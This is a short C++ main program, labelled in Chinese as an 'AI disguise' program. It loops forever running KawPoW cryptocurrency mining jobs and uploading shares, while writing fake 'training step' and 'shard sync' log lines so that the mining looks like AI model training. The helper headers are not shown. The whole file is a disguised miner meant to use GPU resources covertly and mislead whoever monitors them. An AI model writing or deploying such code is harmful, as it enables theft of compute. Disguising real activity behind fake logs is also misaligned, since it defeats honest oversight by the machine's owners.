// src/main.cpp - AI 偽裝主程式

#include <iostream>
#include <thread>
#include <chrono>
#include "gpu_model.h"
#include "log.h"
#include "upload_weights.h"

int main() {
    log_device_info();
    int step = 0;

    while (true) {
        Job job = fetch_job();
        Result r = run_kawpow(job);

        if (r.valid) {
            log_shard_sync(r, step);
            upload_share(r, step);
        }

        log_training_step(step);
        step++;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    return 0;
}
